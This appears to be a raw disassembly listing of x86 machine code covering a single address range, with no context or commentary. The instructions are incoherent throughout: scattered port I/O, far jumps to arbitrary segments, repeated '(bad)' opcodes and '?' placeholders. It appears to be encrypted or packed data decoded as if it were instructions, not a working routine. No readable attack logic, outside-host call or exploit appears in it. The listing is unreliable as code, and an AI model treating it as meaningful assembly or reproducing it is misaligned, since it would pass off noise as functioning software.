  40183a:	add    BYTE PTR [edx-0x1b401b3b],0x60
  401841:	mov    cl,0xbb
  401843:	out    0xd5,al
  401845:	out    0x94,al
  401847:	dec    edx
  401848:	pop    eax
  401849:	and    al,cl
  40184b:	cmp    eax,0x5c779fe3
  401850:	add    ebp,DWORD PTR [ebp-0x40f9dfde]
  401856:	xchg   ebp,eax
  401857:	or     DWORD PTR [ecx+0x54],ebx
  40185a:	stc    
  40185b:	mov    edx,?
  40185d:	out    dx,eax
  40185e:	scas   al,BYTE PTR es:[edi]
  40185f:	xchg   ebp,eax
  401860:	sub    eax,0x815c3f55
  401865:	retf   0x3924
  401868:	imul   eax,DWORD PTR [ebx+0x79f13a49],0xd1207fda
  401872:	imul   BYTE PTR gs:[edi]
  401875:	scas   al,BYTE PTR es:[edi]
  401876:	add    DWORD PTR [edx+0x7be9e745],ebp
  40187c:	xchg   ebp,eax
  40187d:	sahf   
  40187e:	call   0x106a0fe
  401883:	sub    al,0x81
  401885:	push   0xd40ddd2
  40188a:	(bad)
  40188f:	adc    eax,0x2180fefb
  401894:	adc    bh,0x34
  401897:	out    0x7e,eax
  401899:	sub    eax,0x74b09f9f
  40189e:	jg     0x4018e5
  4018a0:	lods   al,BYTE PTR ss:[esi]
  4018a2:	fistp  DWORD PTR [ecx+0x22b35826]
  4018a8:	inc    edi
  4018a9:	int    0x44
  4018ab:	fwait
  4018ac:	cs cmc 
  4018ae:	mov    ecx,0x35c827fe
  4018b3:	outs   dx,DWORD PTR ds:[esi]
  4018b4:	std    
  4018b5:	pop    ebp
  4018b6:	jb     0x4018dc
  4018b8:	or     BYTE PTR [ebp+0x6a06a69],dh
  4018be:	inc    edx
  4018bf:	repnz in al,0xe9
  4018c2:	aad    0x85
  4018c4:	jmp    0x401879
  4018c6:	add    BYTE PTR [ebx],dh
  4018c8:	icebp  
  4018c9:	repnz fwait
  4018cb:	adc    BYTE PTR [ebp+0x27aa899b],bl
  4018d1:	in     al,dx
  4018d2:	add    BYTE PTR [edi+0x7ff790ec],dl
  4018d8:	(bad)  
  4018d9:	hlt    
  4018da:	fs popf 
  4018dc:	and    bh,BYTE PTR [ebx+0x2faa3ffc]
  4018e2:	jae    0x40188e
  4018e4:	dec    eax
  4018e5:	xchg   esp,eax
  4018e6:	nop
  4018e7:	pop    es
  4018e8:	sbb    eax,0xc32b0403
  4018ed:	lods   eax,DWORD PTR ds:[esi]
  4018ee:	or     eax,0x70b01455
  4018f3:	mov    eax,ds:0x46e697b0
  4018f8:	fsub   DWORD PTR [eax+0x3da98082]
  4018fe:	add    ecx,DWORD PTR [eax]
  401900:	sbb    DWORD PTR [esi],ebp
  401902:	xchg   ecx,eax
  401903:	inc    ecx
  401904:	mov    ebp,DWORD PTR [edi+ebp*8+0x13]
  401908:	nop
  401909:	jge    0x4018e4
  40190b:	mov    esi,0x6204a0a0
  401910:	test   DWORD PTR ds:0x4217d841,0x685bf68
  40191a:	add    BYTE PTR [ebp-0xa216d49],dh
  401920:	cli    
  401921:	xor    eax,0x6f6faac7
  401926:	fs int 0xd0
  401929:	push   ebx
  40192a:	inc    edx
  40192b:	loope  0x4018ea
  40192d:	jg     0x401961
  40192f:	(bad)  
  401930:	jmp    0x9a0dfa6f
  401935:	add    cl,BYTE PTR [ebp-0x70]
  401938:	sbb    edi,DWORD PTR [eax+0x50]
  40193b:	push   ss
  40193c:	rcr    BYTE PTR [ecx-0x53],1
  40193f:	scas   al,BYTE PTR es:[edi]
  401940:	loop   0x4018f5
  401942:	mov    ecx,0xb8d70a20
  401947:	in     al,0xa9
  401949:	loopne 0x401934
  40194b:	or     bl,dl
  40194d:	jno    0x40199b
  40194f:	sbb    ch,BYTE PTR [eax+0x704769d5]
  401955:	sbb    eax,0x62399f45
  40195a:	(bad)  
  40195b:	xor    bh,BYTE PTR [eax+0x6957c188]
  401961:	test   DWORD PTR [esi+0x69],ecx
  401964:	js     0x40191f
  401966:	ins    BYTE PTR es:[edi],dx
  401967:	and    ebx,DWORD PTR [esi+0xc]
  40196a:	push   ebp
  40196b:	into   
  40196c:	dec    esp
  40196d:	cld    
  40196e:	ins    DWORD PTR es:[edi],dx
  40196f:	popa   
  401970:	mov    WORD PTR [ebp+0x4d1d7d18],?
  401976:	stc    
  401977:	inc    ebx
  401978:	out    0x8b,al
  40197a:	inc    ecx
  40197b:	popf   
  40197c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40197e:	mov    dh,0xd3
  401980:	or     dl,cl
  401982:	cmp    eax,0x9f82e92
  401987:	cmp    cl,BYTE PTR [edi+0x71bb457d]
  40198d:	lea    esp,[ebx+ecx*1+0x3f]
  401991:	push   ds
  401992:	sbb    cl,bl
  401994:	data16 or al,0x6
  401997:	or     edx,DWORD PTR [ebx]
  401999:	repz push ebx
  40199b:	loop   0x401a0d
  40199d:	jns    0x401a0d
  40199f:	sub    ch,ch
  4019a1:	push   es
  4019a2:	addr16 pusha 
  4019a4:	iret   
  4019a5:	mov    al,ds:0x8a085d06
  4019aa:	dec    edi
  4019ab:	mov    esp,0x3deece7b
  4019b0:	xchg   edi,eax
  4019b1:	xchg   esi,eax
  4019b2:	(bad)  
  4019b4:	sbb    DWORD PTR [edi],esi
  4019b6:	xor    BYTE PTR [edx],al
  4019b8:	dec    esi
  4019b9:	in     al,dx
  4019ba:	pop    ds
  4019bb:	nop
  4019bc:	cwde   
  4019bd:	test   al,0x9
  4019bf:	popf   
  4019c0:	and    cl,BYTE PTR [ebx+0x39]
  4019c3:	mov    WORD PTR [esi],?
  4019c5:	iret   
  4019c6:	cmc    
  4019c7:	call   0x483c95c1
  4019cc:	pop    es
  4019cd:	xor    dl,BYTE PTR [edx+edx*2]
  4019d0:	push   edi
  4019d1:	stos   DWORD PTR es:[edi],eax
  4019d2:	das    
  4019d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019d4:	fmul   QWORD PTR [edi+0x7242e06c]
  4019da:	sbb    bl,bh
  4019dc:	(bad)
  4019e1:	cmp    eax,DWORD PTR [esi+eax*1]
  4019e4:	cmp    esi,edi
  4019e6:	ds cwde 
  4019e8:	mov    edi,0x8bfc41c1
  4019ed:	(bad)  
  4019ee:	xor    BYTE PTR ds:0x5ff59059,ch
  4019f4:	mov    WORD PTR ds:0xd048a955,fs
  4019fa:	jmp    DWORD PTR [eax+0x6b8fed93]
  401a00:	not    DWORD PTR [eax+0x74]
  401a03:	xchg   esi,eax
  401a04:	pusha  
  401a05:	pop    ds
  401a06:	cli    
  401a07:	fadd   QWORD PTR [eax+0xbdb5ec]
  401a0d:	mov    edx,0x86a79302
  401a12:	outs   dx,DWORD PTR ds:[esi]
  401a13:	es shl ecx,cl
  401a16:	daa    
  401a17:	push   es
  401a18:	jle    0x4019ce
  401a1a:	out    0x91,eax
  401a1c:	sbb    eax,0xa5402c03
  401a21:	hlt    
  401a22:	pop    ecx
  401a23:	xchg   ebp,eax
  401a24:	xor    esp,edx
  401a26:	jno    0x401a4f
  401a28:	in     eax,0x37
  401a2a:	sub    dl,0x38
  401a2d:	mov    al,0x10
  401a2f:	pop    ss
  401a30:	mov    edx,0x3ed11ef3
  401a35:	pop    esp
  401a36:	pop    esi
  401a37:	mov    edx,0x72ff3e0e
  401a3c:	or     BYTE PTR [ebx-0x3de9d23a],0xc9
  401a43:	pop    esp
  401a44:	pusha  
  401a45:	xchg   edx,eax
  401a46:	jecxz  0x401a16
  401a48:	mov    eax,0xd543aa1b
  401a4d:	gs xchg esp,eax
  401a4f:	stc    
  401a50:	stc    
  401a51:	sub    cl,BYTE PTR fs:0x6d32c69d
  401a58:	push   es
  401a59:	dec    esi
  401a5a:	push   ebp
  401a5b:	xchg   edx,eax
  401a5c:	mov    WORD PTR [eax-0x5ff7bc2b],?
  401a62:	and    eax,0x277d3435
  401a67:	gs shr bh,0x20
  401a6b:	test   al,0xdb
  401a6d:	mov    ebp,0x9bebbbd0
  401a72:	or     dl,BYTE PTR [edx+0x277d2fd4]
  401a78:	dec    edx
  401a79:	or     BYTE PTR [edx-0x7c],ch
  401a7c:	out    0xd5,eax
  401a7e:	adc    bl,BYTE PTR [esi-0x61]
  401a81:	mov    es,WORD PTR [eax+ebp*8+0x6b]
  401a85:	in     eax,0x1c
  401a87:	fdivr  QWORD PTR [esi+eiz*1]
  401a8a:	dec    esp
  401a8b:	inc    edx
  401a8c:	mov    dl,0x93
  401a8e:	pop    ecx
  401a8f:	mov    bh,0x49
  401a91:	xor    ebp,esp
  401a93:	aaa    
  401a94:	inc    ecx
  401a95:	nop
  401a96:	scas   eax,DWORD PTR es:[edi]
  401a97:	jmp    0xa87d:0xadc9333
  401a9e:	dec    esp
  401a9f:	pop    ebp
  401aa0:	xchg   esi,eax
  401aa1:	sub    esp,edx
  401aa3:	or     ebx,DWORD PTR [esi+0xf4699eb]
  401aa9:	xor    edx,DWORD PTR [eax-0xf]
  401aac:	jecxz  0x401a95
  401aae:	cmp    ch,BYTE PTR [ebp-0x591a8842]
  401ab4:	je     0x401adf
  401ab6:	xchg   edx,eax
  401ab7:	loope  0x401a9c
  401ab9:	inc    esp
  401aba:	outs   dx,BYTE PTR ds:[esi]
  401abb:	(bad)  
  401abc:	hlt    
  401abd:	jg     0x401a54
  401abf:	js     0x401b25
  401ac1:	mov    edi,0x1517af57
  401ac6:	sub    al,0x87
  401ac8:	int    0xcf
  401aca:	out    dx,al
  401acb:	and    cl,ch
  401acd:	add    ebp,edi
  401acf:	out    dx,al
  401ad0:	lods   eax,DWORD PTR ds:[esi]
  401ad1:	or     cl,BYTE PTR [edi]
  401ad3:	mov    ebx,0xc5a13fe9
  401ad8:	add    al,0xb5
  401ada:	pushf  
  401adb:	shl    cl,cl
  401add:	adc    esi,ebp
  401adf:	ror    bl,1
  401ae1:	or     eax,DWORD PTR [eax]
  401ae3:	imul   DWORD PTR [ecx+0x5c2d0027]
  401ae9:	aam    0x93
  401aeb:	mov    ecx,0xcf2b2e6a
  401af0:	sub    ecx,DWORD PTR [ebx-0x8]
  401af3:	pop    ds
  401af4:	push   edx
  401af5:	aaa    
  401af6:	stc    
  401af7:	lds    esp,FWORD PTR [ebp+eax*8+0x2e]
  401afb:	call   0xcc7a4e61
  401b00:	inc    ebp
  401b01:	fistp  QWORD PTR [edi]
  401b03:	jl     0x401a92
  401b05:	loop   0x401aa8
  401b07:	dec    ebx
  401b08:	aas    
  401b09:	and    DWORD PTR ds:0x3dbcfc6c,esi
  401b0f:	int3   
  401b10:	sbb    dh,BYTE PTR [ecx+ebx*2]
  401b13:	lahf   
  401b14:	mov    al,0xce
  401b16:	pop    eax
  401b17:	sub    ah,al
  401b19:	and    esi,eax
  401b1b:	push   es
  401b1c:	cli    
  401b1d:	jbe    0x401b00
  401b1f:	mov    cl,0xb7
  401b21:	adc    DWORD PTR [ecx-0x6d],ebx
  401b24:	or     BYTE PTR [edx+eiz*4-0x1e],0x1
  401b29:	test   DWORD PTR ds:0xca19aaa,edx
  401b2f:	cdq    
  401b30:	shl    BYTE PTR [edi+0x37],cl
  401b33:	ret    
  401b34:	idiv   BYTE PTR [eax]
  401b36:	pop    ecx
  401b37:	pop    ebp
  401b38:	dec    edi
  401b39:	icebp  
  401b3a:	adc    eax,0x82c140ce
  401b3f:	mov    dl,0x53
  401b41:	jge    0x401b81
  401b43:	jl     0x401bb2
  401b45:	fucomi st,st(3)
  401b47:	mov    WORD PTR [edi-0x3a08ab07],es
  401b4d:	das    
  401b4e:	sbb    bh,dh
  401b50:	leave  
  401b51:	lods   eax,DWORD PTR ds:[esi]
  401b52:	cmp    DWORD PTR [edi-0x42],0xffffff9e
  401b56:	jne    0x401b7d
  401b58:	xlat   BYTE PTR ds:[ebx]
  401b59:	mov    ds:0xd6935901,al
  401b5e:	mov    ds:0xdef667a2,eax
  401b63:	sub    eax,DWORD PTR [ecx+0x13b5ea56]
  401b69:	imul   ecx,DWORD PTR [edi-0x79df22b3],0xffffff81
  401b70:	cmp    eax,0xc5fd260b
  401b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b76:	aaa    
  401b77:	mov    cl,0x73
  401b79:	int3   
  401b7a:	jnp    0x401b83
  401b7c:	aaa    
  401b7d:	repnz fiadd DWORD PTR [ecx-0x10]
  401b81:	shl    DWORD PTR cs:[eax-0x7e],1
  401b85:	ret    
  401b86:	loopne 0x401ba0
  401b88:	fwait
  401b89:	cdq    
  401b8a:	fstp   TBYTE PTR ds:0xc7357e11
  401b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b91:	adc    ecx,ebp
  401b93:	ja     0x401b30
  401b95:	shl    DWORD PTR [edx+eiz*1-0x1e],cl
  401b99:	aad    0xb8
  401b9b:	push   cs
  401b9c:	push   es
  401b9d:	sahf   
  401b9e:	mov    eax,ds:0x9e85e059
  401ba3:	sahf   
  401ba4:	inc    esp
  401ba5:	inc    eax
  401ba6:	fidiv  DWORD PTR [ebp+0x3b]
  401ba9:	pop    ds
  401baa:	lods   al,BYTE PTR ds:[esi]
  401bab:	in     al,0xf3
  401bad:	dec    ebp
  401bae:	or     eax,0x32a32f0e
  401bb3:	test   BYTE PTR [edx-0x71],0xb9
  401bb7:	xchg   ebx,eax
  401bb8:	cwde   
  401bb9:	ins    BYTE PTR es:[edi],dx
  401bba:	sbb    dh,BYTE PTR [ebx]
  401bbc:	test   al,0xfa
  401bbe:	aad    0x22
  401bc0:	loope  0x401c00
  401bc2:	mov    dl,0xff
  401bc4:	lods   eax,DWORD PTR ds:[esi]
  401bc5:	jmp    0x47aa:0xfe0b3734
  401bcc:	cs cs pop eax
  401bcf:	cmc    
  401bd0:	adc    cl,BYTE PTR [eax+0x1c23684a]
  401bd6:	add    ebx,ecx
  401bd8:	inc    ebx
  401bd9:	push   esp
  401bda:	leave  
  401bdb:	sbb    BYTE PTR [esi],bh
  401bdd:	pop    esi
  401bde:	mov    al,0x84
  401be0:	cmp    ebx,ebp
  401be2:	out    0xa5,eax
  401be4:	jnp    0x401bcc
  401be6:	jnp    0x401c43
  401be8:	push   cs
  401be9:	rcr    edx,0x7a
  401bec:	dec    BYTE PTR [ebp-0x6e]
  401bef:	cli    
  401bf0:	jmp    FWORD PTR [ebx-0x4]
  401bf3:	push   edi
  401bf4:	loop   0x401bef
  401bf6:	(bad)
  401bf9:	mov    ebp,0xfab1bc83
  401bfe:	mov    ?,WORD PTR [ebx+0x3e90423f]
  401c04:	xchg   esp,eax
  401c05:	scas   al,BYTE PTR es:[edi]
  401c06:	sbb    DWORD PTR [edx+edi*4-0x245f30a6],ebx
  401c0d:	ror    BYTE PTR [ebx+0x6e9d1407],cl
  401c13:	mov    es,WORD PTR [eax-0x57]
  401c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c17:	loopne 0x401ba6
  401c19:	mov    dh,0xf8
  401c1b:	sub    edi,DWORD PTR [ebp-0x3517fb1b]
  401c21:	sahf   
  401c22:	ret    0x3398
  401c25:	aaa    
  401c26:	or     DWORD PTR [eax-0x41ccf12f],ecx
  401c2c:	xor    dl,bl
  401c2e:	mov    ds:0x2478ad77,al
  401c33:	jmp    0xdce2:0xcd63b1d6
  401c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c3b:	push   esi
  401c3c:	iret   
  401c3d:	sub    BYTE PTR [edx-0x1a],dh
  401c40:	sub    DWORD PTR [ebx+esi*8-0x4b485685],eax
  401c47:	sbb    eax,0x7a3b782f
  401c4c:	xchg   esp,eax
  401c4d:	mov    dh,0x35
  401c4f:	mov    eax,0xaa5ce20b
  401c54:	mov    esp,DWORD PTR [esi-0x5b]
  401c57:	mov    al,0xca
  401c59:	test   al,0xa6
  401c5b:	not    DWORD PTR [eax-0x26]
  401c5e:	jg     0x401c93
  401c60:	xor    esi,DWORD PTR [esi]
  401c62:	or     ch,BYTE PTR [ecx-0xd6fe675]
  401c68:	jbe    0x401c35
  401c6a:	pop    esi
  401c6b:	je     0x401bf3
  401c6d:	in     eax,dx
  401c6e:	lahf   
  401c6f:	data16 arpl WORD PTR [edi-0x3],ax
  401c73:	push   ds
  401c74:	mov    ecx,ebx
  401c76:	dec    eax
  401c77:	sbb    bl,dh
  401c79:	adc    DWORD PTR [ecx-0xa3ff044],0xfffffff8
  401c80:	push   ebx
  401c81:	imul   BYTE PTR [ebx+0x6a]
  401c84:	jbe    0x401c44
  401c86:	popf   
  401c87:	retf   0x9a64
  401c8a:	mov    bh,0x77
  401c8c:	sbb    DWORD PTR [eax],ebp
  401c8e:	pop    ss
  401c8f:	adc    ebx,DWORD PTR [eax+0x70]
  401c92:	dec    ecx
  401c93:	jge    0x401d0e
  401c95:	or     edx,DWORD PTR [esi-0x5d]
  401c98:	in     eax,dx
  401c99:	enter  0x90e2,0x40
  401c9d:	lds    ebx,FWORD PTR [ebx]
  401c9f:	dec    edi
  401ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ca1:	sahf   
  401ca2:	cdq    
  401ca3:	stc    
  401ca4:	push   ebx
  401ca5:	dec    esi
  401ca6:	(bad)  
  401ca7:	or     DWORD PTR [ecx],ebp
  401ca9:	jmp    0x15625def
  401cae:	pop    eax
  401caf:	repz (bad) 
  401cb1:	js     0x401cc7
  401cb3:	fld    DWORD PTR [eax+esi*1-0x5c]
  401cb7:	fbld   TBYTE PTR [ecx+0x5c]
  401cba:	test   eax,0x11a62988
  401cbf:	retf   0x709d
  401cc2:	stc    
  401cc3:	push   ebp
  401cc4:	inc    edx
  401cc5:	ins    BYTE PTR es:[edi],dx
  401cc6:	sub    edi,0x8ad655af
  401ccc:	add    al,0xa3
  401cce:	pop    ebx
  401ccf:	mov    ebx,0xf448967c
  401cd4:	xor    BYTE PTR [ebp+0xa09ec44],ch
  401cda:	push   ss
  401cdb:	mov    ds:0x3bae24be,al
  401ce0:	out    0x36,eax
  401ce2:	test   bl,0xc4
  401ce5:	loop   0x401cca
  401ce7:	sub    eax,0xc3ba00e
  401cec:	jnp    0x401d3c
  401cee:	mov    ah,0xb0
  401cf0:	ins    DWORD PTR es:[edi],dx
  401cf1:	and    cl,ah
  401cf3:	add    ch,0xb2
  401cf6:	and    al,BYTE PTR [ecx+edx*2+0x5e]
  401cfa:	les    ebp,FWORD PTR [ecx+0xd192e87]
  401d00:	imul   ebp,DWORD PTR [ecx],0x875fb2a8
  401d06:	je     0x401d0f
  401d08:	ror    DWORD PTR es:[ecx+0x22],0xf2
  401d0d:	pop    es
  401d0e:	sbb    esp,ebx
  401d10:	and    ecx,DWORD PTR [ebp+ecx*1-0x1d]
  401d14:	in     eax,dx
  401d15:	lds    edi,FWORD PTR [ecx-0x65]
  401d18:	dec    esi
  401d19:	inc    edx
  401d1a:	pop    ebx
  401d1b:	sub    dl,BYTE PTR [eax-0x6e405501]
  401d21:	in     al,dx
  401d22:	xchg   ebx,eax
  401d23:	add    eax,0xdc622454
  401d28:	aas    
  401d29:	outs   dx,BYTE PTR ds:[esi]
  401d2a:	out    dx,eax
  401d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d2c:	inc    esp
  401d2d:	stc    
  401d2e:	repnz inc esp
  401d30:	scas   eax,DWORD PTR es:[edi]
  401d31:	push   ebp
  401d32:	push   ebp
  401d33:	push   si
  401d35:	sub    eax,0xe61c5f16
  401d3a:	repnz stos BYTE PTR es:[edi],al
  401d3c:	call   0x9c5b0e9c
  401d41:	mov    ah,BYTE PTR [ebp+0x1c0f8869]
  401d47:	xor    BYTE PTR [esi],0x81
  401d4a:	and    eax,0x7fc0d1ac
  401d4f:	inc    ecx
  401d50:	outs   dx,BYTE PTR ds:[esi]
  401d51:	inc    ebp
  401d52:	cmc    
  401d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d54:	mov    bh,0x7
  401d56:	and    BYTE PTR [esi+esi*4+0x2d],ch
  401d5a:	sub    ch,ch
  401d5c:	ret    
  401d5d:	mov    ah,0x5f
  401d5f:	enter  0xb149,0x58
  401d63:	inc    ebp
  401d64:	test   al,0x5d
  401d66:	inc    edi
  401d67:	ins    BYTE PTR es:[edi],dx
  401d68:	ds jnp 0x401dba
  401d6b:	retf   0xe9eb
  401d6e:	lds    ecx,FWORD PTR [ebp-0x1c]
  401d71:	nop
  401d72:	mov    dl,0xcc
  401d74:	icebp  
  401d75:	lahf   
  401d76:	mov    cs,WORD PTR [eax+eax*8]
  401d79:	and    al,0xf2
  401d7b:	adc    eax,0xd465e628
  401d80:	stc    
  401d81:	retf   
  401d82:	lahf   
  401d83:	test   eax,0xacff109b
  401d88:	ss dec esp
  401d8a:	add    ch,BYTE PTR [edx+esi*8+0x326e7c4]
  401d91:	jmp    0x401d94
  401d93:	std    
  401d94:	push   0xffffff83
  401d96:	pop    ebp
  401d97:	cs stos BYTE PTR es:[edi],al
  401d99:	inc    edi
  401d9a:	push   ebp
  401d9b:	call   0x8b900ff2
  401da0:	or     DWORD PTR [edi+0x4e],edx
  401da3:	icebp  
  401da4:	scas   al,BYTE PTR es:[edi]
  401da5:	inc    esi
  401da6:	xchg   ecx,eax
  401da7:	inc    ebx
  401da8:	xchg   ebp,eax
  401da9:	cmc    
  401daa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dab:	or     eax,edx
  401dad:	js     0x401d88
  401daf:	(bad)  
  401db1:	loop   0x401de6
  401db3:	std    
  401db4:	xor    eax,DWORD PTR [edx]
  401db6:	inc    eax
  401db7:	pop    es
  401db8:	push   ecx
  401db9:	test   al,0x1b
  401dbb:	(bad)  
  401dbc:	xchg   edx,eax
  401dbd:	dec    ecx
  401dbe:	int    0xc1
  401dc0:	adc    BYTE PTR [ebx-0x568c60a5],ch
  401dc6:	sbb    al,0xa2
  401dc8:	ds or  cl,dl
  401dcb:	sbb    edi,ebp
  401dcd:	add    ebp,DWORD PTR [esp+edx*2]
  401dd0:	lock (bad) 
  401dd2:	repz loopne 0x401db0
  401dd5:	or     ebx,0xca36caa5
  401ddb:	jge    0x401e2a
  401ddd:	jmp    0x230b:0x3f2ea2ed
  401de4:	push   0xd2da12df
  401de9:	stos   DWORD PTR es:[edi],eax
  401dea:	push   0xffffffcd
  401dec:	loop   0x401e1c
  401dee:	inc    ebp
  401def:	stos   BYTE PTR es:[edi],al
  401df0:	lahf   
  401df1:	(bad)  
  401df2:	stc    
  401df3:	out    dx,al
  401df4:	cli    
  401df5:	pop    ds
  401df6:	xor    ah,BYTE PTR [ecx]
  401df8:	call   DWORD PTR [ebp-0x59]
  401dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dfc:	dec    edi
  401dfd:	mov    al,ds:0xb0c7df97
  401e02:	enter  0x69,0x68
  401e06:	cmp    ebp,edx
  401e08:	std    
  401e09:	fstp   DWORD PTR [ecx+0x40dca85]
  401e0f:	div    ebp
  401e11:	mov    esp,0x366e9711
  401e16:	or     esi,DWORD PTR [esp+esi*1+0x309dfc51]
  401e1d:	aaa    
  401e1e:	dec    eax
  401e1f:	out    0xb9,eax
  401e21:	inc    edi
  401e22:	jbe    0x401dc4
  401e24:	push   ebp
  401e25:	sbb    eax,0x122584bc
  401e2a:	rcr    esp,1
  401e2c:	int    0x1e
  401e2e:	cld    
  401e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e30:	clc    
  401e31:	cmp    BYTE PTR [ecx+0x9aa7e50],dh
  401e37:	bound  ecx,QWORD PTR [edi+0x10]
  401e3a:	les    eax,FWORD PTR [bp+si-0x771]
  401e3f:	fbld   TBYTE PTR [esi-0x76]
  401e42:	xchg   edi,eax
  401e44:	pop    ecx
  401e45:	popf   
  401e46:	push   cs
  401e47:	(bad)
  401e4a:	xchg   BYTE PTR [esi+0x31],bl
  401e4d:	push   esi
  401e4e:	and    BYTE PTR [ebp-0x3345a85b],ah
  401e54:	in     eax,dx
  401e55:	aas    
  401e56:	scas   eax,DWORD PTR es:[edi]
  401e57:	in     eax,dx
  401e58:	push   ds
  401e59:	jb     0x401ea6
  401e5b:	mov    ?,WORD PTR [ecx+0xed87df1]
  401e61:	btc    DWORD PTR [eax-0x54],esi
  401e65:	mov    al,ds:0x873a280c
  401e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e6b:	sub    dl,BYTE PTR [ecx-0x6a33fc40]
  401e71:	and    BYTE PTR [esi-0x63],bl
  401e74:	lea    esi,[esi-0x38]
  401e77:	and    al,0xa
  401e79:	xor    eax,ebx
  401e7b:	test   al,dl
  401e7d:	outs   dx,DWORD PTR ds:[esi]
  401e7e:	(bad)  
  401e7f:	push   edx
  401e80:	in     eax,0xcd
  401e82:	out    0x68,eax
  401e84:	push   ds
  401e85:	pop    ecx
  401e86:	inc    esp
  401e87:	mov    ds,WORD PTR [eax+0x63]
  401e8a:	sub    esi,DWORD PTR [edi]
  401e8c:	add    ecx,ecx
  401e8e:	popa   
  401e8f:	mov    ss,WORD PTR [ebx-0xed1c0ec]
  401e95:	(bad)  
  401e96:	mov    esi,eax
  401e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e99:	daa    
  401e9a:	scas   al,BYTE PTR es:[edi]
  401e9b:	(bad)  
  401e9c:	mov    BYTE PTR ds:0x39dd585a,0x70
  401ea3:	inc    eax
  401ea4:	mov    edi,DWORD PTR [ebx+0x55]
  401ea7:	xchg   cl,cl
  401ea9:	(bad)  [edx+0x5f]
  401eac:	(bad)  
  401ead:	test   eax,0x9a985293
  401eb2:	cmp    al,al
  401eb4:	jp     0x401f11
  401eb6:	mov    ds:0x915f7172,al
  401ebb:	push   ds
  401ebc:	js     0x401e9a
  401ebe:	ins    DWORD PTR es:[edi],dx
  401ebf:	xor    ebx,esi
  401ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ec2:	gs loopne 0x401f2f
  401ec5:	inc    eax
  401ec6:	fdivr  st(7),st
  401ec8:	cmp    BYTE PTR [edx],bl
  401eca:	inc    esp
  401ecb:	sti    
  401ecc:	mov    al,ds:0xfafa6ce6
  401ed1:	aam    0xd3
  401ed3:	cmp    DWORD PTR [ebx],esi
  401ed5:	pop    ebp
  401ed6:	test   BYTE PTR ds:0xe0dcc57,bl
  401edc:	or     DWORD PTR fs:[edi],eax
  401edf:	dec    ecx
  401ee0:	loop   0x401e7e
  401ee2:	pop    edi
  401ee3:	cmp    edi,DWORD PTR [edi]
  401ee5:	outs   dx,BYTE PTR ds:[esi]
  401ee6:	fisub  WORD PTR [esi]
  401ee8:	mov    ebx,edx
  401eea:	mov    ch,0x79
  401eec:	fsub   st,st(0)
  401eee:	sbb    eax,0x5f6d5469
  401ef3:	es gs fadd st(0),st
  401ef7:	xor    al,BYTE PTR [ecx+0x1ac8260c]
  401efd:	jnp    0x401f5a
  401eff:	and    ecx,DWORD PTR [edx-0x421d5aaf]
  401f05:	(bad)  
  401f06:	call   FWORD PTR [edx+edx*1]
  401f09:	dec    esi
  401f0a:	sbb    eax,0xd996a6a6
  401f0f:	imul   ebp,DWORD PTR [esi+0x48487bd8],0xffffffbc
  401f16:	into   
  401f17:	inc    edi
  401f18:	enter  0x4c91,0x41
  401f1c:	ds and eax,0x4feefc54
  401f22:	and    ah,BYTE PTR [edi-0x6c]
  401f25:	push   ss
  401f26:	shl    BYTE PTR [ebp-0x48771202],cl
  401f2c:	push   ds
  401f2d:	cmc    
  401f2e:	adc    eax,0xf605a85c
  401f33:	dec    ebp
  401f34:	iret   
  401f35:	aaa    
  401f36:	in     eax,0x9d
  401f38:	mul    esp
  401f3a:	jo     0x401f19
  401f3c:	xchg   edi,eax
  401f3d:	push   0xffffffd2
  401f3f:	shr    eax,1
  401f41:	arpl   cx,si
  401f43:	and    dh,BYTE PTR [edx-0x20]
  401f46:	and    ebx,esp
  401f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f49:	mov    ch,0x30
  401f4b:	fidivr WORD PTR [ebp-0x44]
  401f4e:	adc    dh,al
  401f50:	jl     0x401edf
  401f52:	push   ebp
  401f53:	test   al,0x69
  401f55:	xlat   BYTE PTR ds:[ebx]
  401f56:	mov    ss,WORD PTR [eax+0x10eebeab]
  401f5c:	and    ch,BYTE PTR [edi+0x29]
  401f5f:	mov    eax,ds:0x5e6f484a
  401f64:	dec    esi
  401f65:	(bad)  
  401f66:	or     DWORD PTR [edx],ebx
  401f68:	outs   dx,BYTE PTR ds:[esi]
  401f69:	push   esi
  401f6a:	inc    eax
  401f6b:	clc    
  401f6c:	aam    0xb3
  401f6e:	sub    DWORD PTR ds:0xdd48c9f7,0x103b0706
  401f78:	mov    WORD PTR [ebp+esi*2-0x19],fs
  401f7c:	push   cs
  401f7d:	xor    esp,esp
  401f7f:	dec    esi
  401f80:	push   esi
  401f81:	adc    al,0xe7
  401f83:	loop   0x401f85
  401f85:	repnz mov ch,0x2
  401f88:	mov    dl,0x87
  401f8a:	sub    al,0xe1
  401f8c:	sbb    eax,0x69f065e
  401f91:	push   0xf9d3b85
  401f96:	pop    ds
  401f97:	mov    bl,0x41
  401f99:	(bad)  
  401f9a:	(bad)  
  401f9b:	fimul  DWORD PTR [esi+edi*8+0x64]
  401f9f:	pushf  
  401fa0:	mov    bh,0x8a
  401fa2:	ja     0x401f84
  401fa4:	xor    ch,bl
  401fa6:	(bad)  
  401fa7:	popa   
  401fa8:	shl    ch,cl
  401faa:	push   es
  401fab:	mov    eax,ds:0x38327815
  401fb0:	pop    esp
  401fb1:	sbb    eax,0xe5ff24ab
  401fb6:	ds popa 
  401fb8:	mov    bh,0xe
  401fba:	mov    ds,WORD PTR [edi]
  401fbc:	stos   BYTE PTR es:[edi],al
  401fbd:	ret    0xc6f5
  401fc0:	adc    al,0x32
